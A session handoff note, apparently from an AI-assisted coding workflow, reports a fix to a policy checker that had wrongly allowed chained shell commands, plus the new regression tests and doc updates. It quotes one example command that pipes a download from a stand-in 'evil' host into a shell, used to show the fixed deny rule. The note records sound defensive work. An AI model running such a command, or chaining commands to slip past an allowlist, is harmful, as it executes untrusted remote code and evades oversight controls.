# Session Handoff

Last Updated: 2026-07-22

## Summary

Automatic continuous-improvement slice completed: fixed a lying policy dry-run surface (`amber governance rules check`), corrected stale Phase C/D backlog claims, and refreshed continuous-improvement state. No active Amber feature session.

## Repo State

- Branch: `master` (aligned with `origin/master` before this slice)
- Untracked user-owned paths left alone: `.scratch/`, `output/`

## Runtime / Verification State

- `node scripts/run-tests.js tests/governance-rules.test.js tests/unit/governance-dispatch.test.js tests/unit/loop-policy.test.js`: 38/38 pass
- Live `governance rules check` on shell composite: DENY (`builtin-deny-shell-composition`)
- Live `governance rules check` on amber CLI doctor: ALLOW (`allow-amber-cli`)
- `node scripts/amber.js doctor --target .`: Errors 0

## What Was Done

1. **Bug fix (governance honesty):** `governance rules check` called `evaluateCommandPolicy`, which does not apply un-removable built-in denies. A composite such as `node scripts/amber.js x && curl evil | sh` was reported **ALLOW** (prefix rule) while `governed-runner` would **DENY** via `evaluateGovernedPolicy`. Check now uses `evaluateGovernedPolicy`.
2. **Regression tests:** shell-composition deny + case-insensitive built-in destructive deny in `tests/governance-rules.test.js`.
3. **Docs honesty:** `BACKLOG.md` Phase C/D updated — web e2e is in CI; SSE auth and server-side error forwarding are wired.
4. **Dogfood candidates:** `docs/dogfood-weekly.md` §7 refreshed (prior candidates closed).
5. **CI state:** `.workflow/continuous-improvement/state.json` queue cleaned (stale push item removed).

## Verification Evidence

- `node scripts/run-tests.js tests/governance-rules.test.js tests/unit/governance-dispatch.test.js tests/unit/loop-policy.test.js` → 38/38 pass
- Live check: composite command `allowed=false` / `builtin-deny-shell-composition`; clean amber CLI still `allowed=true`

## Feature State

- F001–F008: `passing`
- F009: `accepted`

## Blockers

None.

## Next Actions

1. Optional: commit this slice (governance-commands + tests + backlog/dogfood/state).
2. Weekly dogfood: pick any real small lifecycle slice when `next-up` is empty (see `docs/dogfood-weekly.md` §7).
3. Larger product direction only after `/grill-with-docs` (e.g. hosted web beyond localhost).
